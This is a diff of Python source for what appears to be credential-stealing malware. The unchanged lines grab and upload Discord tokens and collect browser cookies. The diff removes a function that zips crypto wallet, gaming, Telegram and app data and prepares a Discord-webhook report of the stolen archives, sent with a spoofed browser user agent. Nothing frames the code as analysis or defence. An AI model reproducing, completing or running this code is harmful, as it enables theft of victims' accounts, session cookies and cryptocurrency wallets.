@@ -347,73 +347,6 @@ def GetDiscord(path, arg):
                             # writeforfile(Tokens, 'tokens')
                             dclass.uploadToken(tokenDecoded)
 
-
-def GatherZips(paths1, paths2, paths3):
-    thttht = []
-    for patt in paths1:
-        a = threading.Thread(target=ZipThings,
-                             args=[patt[0], patt[5], patt[1]])
-        a.start()
-        thttht.append(a)
-
-    for patt in paths2:
-        a = threading.Thread(target=ZipThings,
-                             args=[patt[0], patt[2], patt[1]])
-        a.start()
-        thttht.append(a)
-
-    a = threading.Thread(target=ZipTelegram,
-                         args=[paths3[0], paths3[2], paths3[1]])
-    a.start()
-    thttht.append(a)
-
-    for thread in thttht:
-        thread.join()
-    global WalletsZip, GamingZip, OtherZip
-    # print(WalletsZip, GamingZip, OtherZip)
-
-    wal, ga, ot = "", "", ""
-    if not len(WalletsZip) == 0:
-        wal = ":coin Wallets\n"
-        for i in WalletsZip:
-            wal += f"└─ [{i[0]}]({i[1]})\n"
-    if not len(WalletsZip) == 0:
-        ga = ":video_game Gaming:\n"
-        for i in GamingZip:
-            ga += f"└─ [{i[0]}]({i[1]})\n"
-    if not len(OtherZip) == 0:
-        ot = ":tickets Apps\n"
-        for i in OtherZip:
-            ot += f"└─ [{i[0]}]({i[1]})\n"
-    headers = {
-        "Content-Type":
-        "application/json",
-        "User-Agent":
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
-    }
-
-    # Has a problem.
-
-    data = {
-        "content":
-        "",
-        "embeds": [{
-            "title": f"{wh_name}  -  Zips",
-            "description": f"{wal}\n{ga}\n{ot}",
-            "color": eb_color,
-            "footer": {
-                "text": eb_footer,
-                "icon_url": "",
-            },
-        }],
-        "username":
-        wh_name,
-        "avatar_url":
-        wh_avatar,
-        "attachments": [],
-    }
-
-
 def ZipTelegram(path, arg, procc):
     global OtherZip
     pathC = path
@@ -665,9 +598,6 @@ def GatherAll():
             a = threading.Thread(target=GetCookies, args=[patt[0], patt[4]])
             a.start()
             Threadlist.append(a)
-            
-    threading.Thread(target=GatherZips,
-                     args=[browserPaths, PathsToZip, Telegram]).start()
         
     DETECTED = Trust(Cookies)
     if DETECTED is True:
